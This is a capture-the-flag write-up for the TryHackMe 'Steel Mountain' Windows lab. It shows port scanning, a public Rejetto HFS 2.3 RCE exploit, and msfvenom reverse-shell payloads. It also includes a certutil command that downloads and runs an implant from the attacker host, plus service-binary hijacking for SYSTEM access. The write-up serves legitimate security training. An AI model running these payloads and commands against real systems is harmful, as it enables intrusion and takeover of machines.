---
title: Steel Mountain WriteUp
description: Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
tags:
- writeups
- tryhackme
- windows
- polished
---
## Enumeration

Target is a Windows machine so likely blocking ping

Initial port scan

```bash
sudo nmap -Pn 10.10.115.107
```

Results:
```bash
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49163/tcp open  unknown
```

Port 80 shows a webpage saying employee of the month.  
The image name is BillHarper.png answering who the employee is.
![Employee of the month](/images/steelmountain-1.png)

Digging into http server on port 8080
```bash
sudo nmap -Pn -p 8080 -sV 10.10.115.107
...
PORT     STATE SERVICE VERSION
8080/tcp open  http    HttpFileServer httpd 2.3
```

Googling revealed the name is `Rejetto HTTP File Server` and version 2.3 has an RCE vuln.

## Initial Access

`searchsploit rejetto` showed the exploits locally and so I copied the exploit to make modifications
```bash
cp /usr/share/exploitdb/exploits/windows/remote/39161.py exploit.py
```
I edited the exploit to have my ip_addr and port 1234.

I opened `msfconsole` and started a shell handler
```msf
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 1234
set exitonsession false
run -j
```
The `exitonsession false` is important as the exploit comments say that it will spawn multiple shells
and that we need to handle that.

I received 4 shells.

## Getting Meterpreter

The shell upgrade module failed so had to instead create a meterpreter binary and copy it over.
```bash
msfvenom -e x86/shikata_ga_nai -p windows/meterpreter/reverse_tcp 'LHOST=10.4.32.196' LPORT=8081 -f exe > /var/www/html/steelmountain.exe
```

Started a handler with
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LPORT 8081
run -j
```
From one of the windows sessions I downloaded and ran the implant with:
```cmd
certutil.exe -urlcache -split -f "http://10.4.32.196/steelmountain.exe" C:\Users\bill\steelmountain.exe
cd C:\Users\bill
START /B /I steelmountain.exe
```
I then backgrounded the session with ++ctrl+z++

## Escalation

Copied latest version of PowerUp.ps1 to machine

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```
**Output**
```bash
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
I then backgrounded the session with ++ctrl+z++

Meaning we can stop the `AdvancedSystemCareService9` service, replace
`C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` with a malicious binary and restart the service
to elevate to system.

Generated replacement with
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.32.196 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```
Start a netcat listener
```bash
nc -vlp 4443
```
In meterpreter stop the service, replace the binary and restart it
```
load extapi
service_control stop advancedsystemcareservice9
cd C:/Program\ Files\ (x86)/IObit/Advanced\ SystemCare/
cp ASCService.exe ASCService.exe.bak
upload Advanced.exe ASCService.exe
service_control start advancedsystemcareservice9
```
We then get a lovely message in our `nc` terminal
```bat
connect to [10.4.32.196] from (UNKNOWN) [10.10.141.129] 49258
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

From the shell, get the admin flag with:
```bat
type C:\Users\Administrator\Desktop
```
